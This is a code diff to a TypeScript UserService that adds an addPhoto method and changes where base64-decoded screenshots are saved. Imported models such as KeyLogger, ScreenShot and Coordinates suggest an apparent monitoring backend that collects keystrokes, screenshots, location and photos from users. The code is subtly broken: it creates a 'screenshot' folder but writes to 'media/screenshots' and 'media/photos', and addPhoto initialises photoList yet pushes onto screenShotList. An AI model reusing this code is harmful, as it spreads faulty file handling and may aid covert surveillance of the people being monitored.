@@ -19,6 +19,7 @@ import { Coordinates } from "../models/Coordinates";
 import { TimeOnApp } from "../models/TimeOnApp";
 import { KeyLogger } from "../models/KeyLogger";
 import { ScreenShot } from '../models/ScreenShot';
+import { Photo } from '../models/Photo';
 
 @Service()
 export class UserService {
@@ -123,20 +124,50 @@ export class UserService {
         const buff = new Buffer(screenShot.screenShot, 'base64');
 
         try {
-            fs.mkdirSync("screenshot");
+            fs.mkdirSync("screenshot", {recursive: true});
         } catch (err) {
             if (err.code !== "EEXIST") {
                 throw err;
             }
         }
 
-        const filePath = "screenshot/" + fileName + ".png";
+        const filePath = "media/screenshots/" + fileName + ".png";
 
         fs.writeFileSync(filePath, buff);
 
         screenShot.path = filePath;
 
         user.screenShotList.push(screenShot);
+
+        await this.userRepository.save(user);
+
+        return user;
+    }
+
+    public async addPhoto(photo: Photo, user: User): Promise<User> {
+        if (user.photoList === undefined) {
+            user.photoList = [];
+        }
+
+        const fileName = uuidv4();
+
+        const buff = new Buffer(photo.img, 'base64');
+
+        try {
+            fs.mkdirSync("screenshot", {recursive: true});
+        } catch (err) {
+            if (err.code !== "EEXIST") {
+                throw err;
+            }
+        }
+
+        const filePath = "media/photos/" + fileName + ".png";
+
+        fs.writeFileSync(filePath, buff);
+
+        photo.path = filePath;
+
+        user.screenShotList.push(photo);
 
         await this.userRepository.save(user);
 
